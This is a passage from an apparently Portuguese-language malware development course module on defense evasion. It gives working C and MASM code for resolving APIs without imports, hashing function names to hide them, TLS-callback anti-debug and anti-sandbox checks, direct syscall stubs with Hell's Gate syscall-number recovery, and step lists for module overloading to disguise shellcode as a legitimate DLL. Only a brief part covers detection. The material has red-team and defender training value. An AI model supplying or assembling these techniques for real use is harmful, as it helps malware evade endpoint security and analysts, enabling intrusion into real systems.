            if (_wcsicmp(pBase, pwszName) == 0)
                return (HMODULE)pEntry->DllBase;
        }
        pCur = pCur->Flink;
    }
    return NULL;
}
```

Não chama GetModuleHandle → não passa por hook → não aparece em IAT.

### Manual GetProcAddress via Export Table

```c
FARPROC GetProcAddressCustom(HMODULE hMod, LPCSTR pszName) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)hMod + pDos->e_lfanew);

    // Export Directory
    DWORD dwExpRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!dwExpRva) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + dwExpRva);

    PDWORD pNames    = (PDWORD)((BYTE*)hMod + pExp->AddressOfNames);
    PWORD  pOrdinals = (PWORD) ((BYTE*)hMod + pExp->AddressOfNameOrdinals);
    PDWORD pFuncs    = (PDWORD)((BYTE*)hMod + pExp->AddressOfFunctions);

    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        LPCSTR pName = (LPCSTR)((BYTE*)hMod + pNames[i]);
        if (strcmp(pName, pszName) == 0) {
            WORD ord = pOrdinals[i];
            return (FARPROC)((BYTE*)hMod + pFuncs[ord]);
        }
    }
    return NULL;
}
```

### Strings Hashing — Esconder Nomes de Função

Hardcode hashes de nomes em vez de strings:

```c
DWORD Djb2Hash(LPCSTR str) {
    DWORD h = 5381;
    while (*str) h = ((h << 5) + h) + (*str++);
    return h;
}

FARPROC GetProcAddressByHash(HMODULE hMod, DWORD dwHash) {
    // [...] mesma estrutura, mas compara Djb2Hash(pName) == dwHash
}

// Uso:
// Hash precomputado: Djb2Hash("NtAllocateVirtualMemory") = 0x4C4D2A48
FARPROC pNtAlloc = GetProcAddressByHash(hNtdll, 0x4C4D2A48);
```

Strings/IDA strings refs ficam vazias. Para reverter: precisa bruteforce hash → table de funções ntdll.

---

## Library Proxy Loading

### Conceito

Em vez de `LoadLibrary("evil.dll")`, fazer outro mecanismo invocar load:
- Image load callbacks (EDR hook) ainda dispara, mas **caller aparenta legítimo**.
- Stack trace no momento do load aponta para função MS, não para nosso código.

### Técnicas

#### 1. `LoadLibrary` via WinAPI Indireta

Algumas APIs disparam LoadLibrary internamente:

```c
// CryptAcquireContext força load de CSP DLL
HCRYPTPROV hProv;
CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
// → carregou rsaenh.dll sem nossa LoadLibrary explícita
```

Stack trace no image load callback mostra `cryptbase!CryptAcquireContext` como chamador, não nosso payload.

#### 2. Delegação via COM

```c
// Instantiation COM → carrega objeto + DLL dependentes
IUnknown* pUnk;
CoCreateInstance(CLSID_WshShell, NULL, CLSCTX_INPROC_SERVER, IID_IUnknown, (void**)&pUnk);
// Carrega wshom.ocx
```

#### 3. Proxy DLL como Sideload

Ver `15_dll_sideloading.md`. DLL nossa exporta forwarders para DLL legítima. App principal carrega nossa DLL como se fosse legítima.

---

## TLS Callbacks para Anti-Debug

### O Que São TLS Callbacks

Thread Local Storage callbacks executam **antes** do EntryPoint do PE em cada `DLL_PROCESS_ATTACH`, `DLL_THREAD_ATTACH`, etc. Listados em `IMAGE_DIRECTORY_ENTRY_TLS` do PE.

Anti-debug: ao anexar debugger ao processo, debugger pausa em EntryPoint. TLS callback executa **antes** → debugger não viu → atacante já checou e abortou.

### Implementação MSVC

```c
#include <windows.h>

void NTAPI TlsCallback(PVOID h, DWORD reason, PVOID rsv) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Anti-debug check
        if (IsDebuggerPresent()) {
            ExitProcess(0);
        }

        BOOL bRemote = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &bRemote);
        if (bRemote) ExitProcess(0);

        // Anti-sandbox: uptime
        if (GetTickCount64() < 5 * 60 * 1000) ExitProcess(0);

        // Tudo OK — continua normalmente até main()
    }
}

// Registrar callback na TLS table
#ifdef _M_X64
    #pragma comment(linker, "/INCLUDE:_tls_used")
    #pragma comment(linker, "/INCLUDE:_tls_callback_func")
    #pragma const_seg(".CRT$XLB")
    EXTERN_C const PIMAGE_TLS_CALLBACK _tls_callback_func = TlsCallback;
    #pragma const_seg()
#else
    #pragma comment(linker, "/INCLUDE:__tls_used")
    #pragma comment(linker, "/INCLUDE:__tls_callback_func")
    #pragma data_seg(".CRT$XLB")
    PIMAGE_TLS_CALLBACK _tls_callback_func = TlsCallback;
    #pragma data_seg()
#endif

int main() {
    // main executa só se TLS callback não abortou
    printf("[+] Sem debugger detectado\n");
    return 0;
}
```

### Detecção Defensiva

- Debugger moderno (x64dbg, IDA) tem opção "break on TLS callback" → defender ativa, intercepta.
- Yara: presence de TLS directory + IsDebuggerPresent reference = padrão suspeito.
- AV: TLS callback em binário "user-mode comum" é anomalia.

---

## MASM Assembly Basics — Inline ASM

### Por Que Inline ASM

C/C++ não permite inline ASM em x64 MSVC. Precisa `.asm` separado + `ml64.exe`. Útil para:

- Syscall stubs (`syscall` instr direto).
- Stack pivot.
- Heaven's Gate.
- Position-independent shellcode segments.

### Syscall Stub Direto (NtAllocateVirtualMemory)

```asm
; ntalloc.asm
.code

NtAllocVirtMem PROC
    mov r10, rcx                  ; RCX salvo em R10 (calling convention syscall)
    mov eax, 18h                  ; SSN de NtAllocateVirtualMemory (Win11)
    syscall
    ret
NtAllocVirtMem ENDP

END
```

```c
// Linkar com .asm — chamável como NTSTATUS NtAllocVirtMem(...)
extern NTSTATUS NtAllocVirtMem(HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);

PVOID pAlloc = NULL;
SIZE_T sz = 0x1000;
NtAllocVirtMem(GetCurrentProcess(), &pAlloc, 0, &sz,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

### MSBuild integração

Adicionar `.asm` no .vcxproj:

```xml
<ItemDefinitionGroup>
  <MASM>
    <PreprocessorDefinitions>%(PreprocessorDefinitions)</PreprocessorDefinitions>
  </MASM>
</ItemDefinitionGroup>
<ItemGroup>
  <MASM Include="ntalloc.asm" />
</ItemGroup>
<ImportGroup Label="ExtensionTargets">
  <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
</ImportGroup>
```

### SSN Discovery — Recuperar Syscall Numbers

SSNs mudam entre versões Windows. Recuperar em runtime:

```c
// Hell's Gate: ler primeiro byte de NtXxx em ntdll
// Ntdll exporta cada Nt syscall stub: 4C 8B D1 B8 [SSN] 00 00 00 0F 05 C3
PBYTE pStub = (PBYTE)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
DWORD dwSsn = *(DWORD*)(pStub + 4);  // offset 4 = SSN
```

Variante mais robusta (Halo's Gate): se hook detectado (`mov eax, ssn` substituído por jmp), buscar SSN em syscall adjacente (sysnums são sequenciais por ordem alfabética em Win10+).

---

## Module Overloading (vs Module Stomping)

### Diferença

- **Module Stomping**: identifica DLL "lixo" carregada, sobrescreve seção `.text` dela com shellcode. DLL stomp continua existindo, mas executable code é nosso.
- **Module Overloading**: aloca módulo legítimo na memória, copia seu conteúdo, depois sobrescreve `.text` com shellcode. Aparenta ser DLL legítima em memory scan (mesmo PE header), mas código é nosso.

### Module Overloading Steps

1. `MapViewOfFile` da DLL "decoy" (ex: `dbghelp.dll`) em memória nossa.
2. `VirtualAlloc(NULL, size, ...)` para destino.
3. Copiar PE da decoy para destino.
4. Sobrescrever `.text` do destino com shellcode.
5. Aplicar relocations + IAT (resolver imports da decoy).
6. `VirtualProtect(.text, ..., PAGE_EXECUTE_READ)`.
7. Executar via jump no payload (offset escolhido em `.text`).

Vantagem vs stomping: não modifica módulo já carregado pelo processo legítimo. Memory scan vê "nova" DLL com layout válido + header válido + entropy normal (mistura de PE + shellcode).

### Combinar com Forrest Orr's PhantomDLL Hollowing

`PhantomDLL` (Orr, 2020): variante avançada que escolhe DLL decoy compatível com tamanho do shellcode + força loader a "indexar" módulo overloaded em PEB → aparece em `EnumProcessModules` como módulo legítimo.

---

## Módulos Relacionados

`08_runtime_evasion_sleepmask.md` é o complemento natural — sleep masking estende as técnicas de load time pra runtime. `06_edr_telemetria_e_hooking.md` mostra o que o EDR coleta, alimentando priorização de evasão. `05_wdac_bypass.md` cobre como WDAC e assinatura de código limitam o que pode ser carregado. MITRE ATT&CK: T1620 (Reflective Code Loading), T1055.001 (DLL Injection), T1574.002 (DLL Side-Loading).

---

## Leitura Complementar

- Stephen Fewer — Reflective DLL Injection (paper original, 2011)
- Cobalt Strike Arsenal Kit documentation
- Sektor7 Institute — Malware Development
- TheWover/donut — shellcode generation from PE/DLL
- hasherezade/pe-sieve — detectar modificações em PE na memória
- FuzzySecurity — Reflective Injection Workshop
- Ferramentas: pe-sieve, moneta, BeaconEye, GetInjectedThread, Cobalt Strike Arsenal Kit
